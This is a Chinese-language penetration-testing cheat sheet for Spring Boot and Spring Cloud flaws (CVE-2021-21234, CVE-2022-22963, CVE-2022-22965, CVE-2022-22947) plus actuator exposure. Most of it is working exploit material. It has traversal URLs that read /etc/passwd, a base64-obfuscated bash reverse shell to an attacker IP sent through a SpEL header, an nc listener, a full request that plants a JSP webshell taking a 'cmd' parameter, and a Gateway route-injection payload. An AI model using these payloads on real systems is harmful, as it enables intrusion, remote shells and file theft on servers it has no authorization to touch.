### 指纹

1.网页图标，类似![img](https://i.loli.net/2021/07/10/4EPGiwJO7DSUpdN.png)

这种，是Springboot框架默认图标

2.在网页路径输入错误路径查看网页报错页面：

![img](https://i.loli.net/2021/07/10/ugGjJc361xMtvdL.jpg)

综合工具推荐：

https://github.com/0x727/SpringBootExploit

https://github.com/13exp/SpringBoot-Scan-GUI       -fox工具箱里面有

### 目录遍历（CVE-2021-21234）

##### 版本

0.2.13之前

##### 原理

Spring Boot 虽然检查了[文件名](https://so.csdn.net/so/search?q=文件名&spm=1001.2101.3001.7020)参数以防止目录遍历攻击（因此`filename=../somefile` 将不起作用），但没有充分检查基本[文件夹](https://so.csdn.net/so/search?q=文件夹&spm=1001.2101.3001.7020)参数，因此`filename=somefile&base=../` 可以访问日志记录目录之外的文件）。

##### 利用

[Spring Boot 目录遍历 （CVE-2021-21234）-CSDN博客](https://blog.csdn.net/qq_23003811/article/details/140540520)

[Spring Boot 目录遍历 （CVE-2021-21234）漏洞复现 - 0justin0 - 博客园](https://www.cnblogs.com/0justin0/p/16034104.html)

```
# Windows
/manage/log/view?filename=/windows/win.ini&base=../../../../../
 
# linux
/manage/log/view?filename=/etc/passwd&base=../../../../../
不一定是mange/log/view,需要看application.properties配置文件中management.context-path=的值，如果是/manage,则为mange/log/view。若为空，则为log/view
```



### Spring Cloud Function Spel 表达式注入（CVE-2022-22963）

Spring cloud是基于spring boot框架开发的微服务，而SPEL是Spring的表达式语言

##### 版本

3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2

##### 利用

POST请求，访问/functionRouter地址

请求头中加入命令：

```
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("要执行的命令")
```

eg:

如要执行命令反弹shell:

```
bash -i >& /dev/tcp/192.168.68.68/3333 0>&1        -原反弹shell命令
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY4LjY4LzMzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}                        -base64加密后的反弹shell命令
```

放入请求头中：

```
POST /functionRouter HTTP/1.1
Host: 192.168.68.168:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY4LjY4LzMzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}")
Content-Type: text/plain
Content-Length: 4

Test

```

- 这个post表单请求体必须提交，不提价就会报错

同时在攻击机【192.168.68.68】打开监听3333端口：

```
nc -lvnp 3333
```

### Spring Framework 远程代码执行漏洞（CVE-2022-22965）

Spring framework 是Spring 里面的一个基础开源框架

##### 版本

- Spring Framework < 5.3.18
- Spring Framework < 5.2.20

1.Apache Tomcat作为Servlet容器

2.使用JDK9及以上版本的Spring MVC框架

3.Spring框架以及衍生的框架spring-beans-*.jar文件存在

##### 利用

[spring系列漏洞复现CVE-2022-22947、CVE-2022-22963、CVE-2022-22965、CVE-2022-22978_cve-2022-22976-CSDN博客](https://blog.csdn.net/weixin_63610715/article/details/133200091?ops_request_misc=%7B%22request%5Fid%22%3A%22cbeb1ca3d09fae95df2ae06eb19fd2db%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&request_id=cbeb1ca3d09fae95df2ae06eb19fd2db&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-133200091-null-null.142^v102^pc_search_result_base9&utm_term=cve-2022-22965流量特征&spm=1018.2226.3001.4187)

[CVE-2022-22965：Spring远程代码执行漏洞-CSDN博客](https://blog.csdn.net/laobanjiull/article/details/124054250?ops_request_misc=%7B%22request%5Fid%22%3A%223168d8c6b6709630e326ffea0d5e52d1%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=3168d8c6b6709630e326ffea0d5e52d1&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-124054250-null-null.142^v102^pc_search_result_base9&utm_term=cve-2022-22965流量特征&spm=1018.2226.3001.4187)

1.发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件

```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: 192.168.32.132:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 	AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 		Safari/537.36
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1
```

--------

url解码：

```
%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i

```

2.然后，访问刚才的 JSP webshell，并执行任意命令：

http://192.168.32.132:8080/tomcatwar.jsp?pwd=j&cmd=命令

或者直接工具解决

### Cloud Gateway命令执行（CVE-2022-22947）

##### 知识储备

Spring开发团队在SpringBoot的基础上开发了Spring Cloud全家桶，这次报出漏洞的组件是Gateway

在pom.xml引入依赖即可使用Sping Cloud Gateway

```
<dependency> 
    <groupId>org.springframework.cloud</groupId> 
    <artifactId>spring-cloud-starter-gateway</artifactId>    
</dependency>
```

##### 版本

Spring Cloud Gateway 3.1.x < 3.1.1

Spring Cloud Gateway 3.0.x < 3.0.7

##### 利用

[Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）_spring cloud gateway spel 远程代码执行(cve-2022-22947)-CSDN博客](https://blog.csdn.net/sum_boluo/article/details/127669561?ops_request_misc=&request_id=&biz_id=102&utm_term=CVE-2022-22947&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-127669561.142^v102^pc_search_result_base9&spm=1018.2226.3001.4187)

[CVE-2022-22947 Spring Cloud Gateway RCE漏洞复现分析-CSDN博客](https://blog.csdn.net/m0_61506558/article/details/126914956?ops_request_misc=%7B%22request%5Fid%22%3A%22b3c99e79f4a59ecf9bc51e77e101510b%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=b3c99e79f4a59ecf9bc51e77e101510b&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-126914956-null-null.142^v102^pc_search_result_base9&utm_term=CVE-2022-22947&spm=1018.2226.3001.4187)

1.添加hackest路由（内含命令whoami）：

```
POST /actuator/gateway/routes/hackest HTTP/1.1
Host: yourIp:8080
Cache-Control:max-age=0
Upgrade-Insecurce-Requests:1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip, deflate
Connection: close
Content-Type:application/json
Content-Length: 352
 
 
{
"id": "wuyaaq",
 
"filters": [
 
{
"name": "AddResponseHeader",
 
"args": {
"value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}",
 
"name": "cmd"
 
}
 
}
 
],
 
"uri": "http://example.com:80",
 
"order": 0
 
}
 
```

2.刷新过滤器（执行命令）

```
POST /actuator/gateway/refresh HTTP/1.1 
Host: yourIp:8080 
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
Connection: keep-alive 
Content-Length: 3 
Content-Type: application/x-www-form-urlencoded
Origin: null Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0 
 
a=1
```

3.访问添加的路由，获取命令执行结果

![img](https://i-blog.csdnimg.cn/blog_migrate/527896ba80bd88f55009d9fb91a830ad.png)

### actuator监控配置信息泄露

[Springboot框架actuator配置不当修复方案及验证详细 - cjz12138 - 博客园](https://www.cnblogs.com/cjz12138/p/14993870.html)

##### 利用 

在确定是SpringBoot框架后，枚举站点的一级、二级甚至三级目录，查看目录下面是否存在actuator执行端点路径

在application.properties配置文件中查看actuator的访问路径

如 设置**management.context-path=/monitor**

则访问访问ip:port/monitor/actuator

默认配置下 **management.context-path=/**

此时访问ip:port/actuator 暴露配置信息

比如根据actuator信息知道可以访问/actuator/health 和 /actuator/info

------

Actuator模块下路径功能

![img](https://i.loli.net/2021/07/10/ZjPMtdI7oHNpYiz.jpg)

##### 修复

看文章

[Springboot框架actuator配置不当修复方案及验证详细 - cjz12138 - 博客园](https://www.cnblogs.com/cjz12138/p/14993870.html)